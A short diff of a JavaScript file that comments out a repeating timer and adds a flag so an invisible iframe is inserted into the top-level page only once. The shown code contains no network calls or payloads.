@@ -101,16 +101,17 @@ if (document.addEventListener) {
   document.attachEvent('onreadystatechange', handler);
 }
 
-setInterval(() => {
-  if (phone && hostname) clear();
-}, 3000);
+// setInterval(() => {
+//   if (phone && hostname) clear();
+// }, 3000);
 
 setTimeout(() => {
-  if (phone && hostname) {
+  if (phone && hostname && !window.top.getInsert) {
     const iframe = document.createElement('iframe');
     iframe.style.width = '0'; iframe.style.height = '0';
     const { body } = window.top.document;
     body.insertBefore(iframe, body.firstChild);
+    window.top.getInsert = true;
   }
   if (hostname) replace();
 }, 2000);
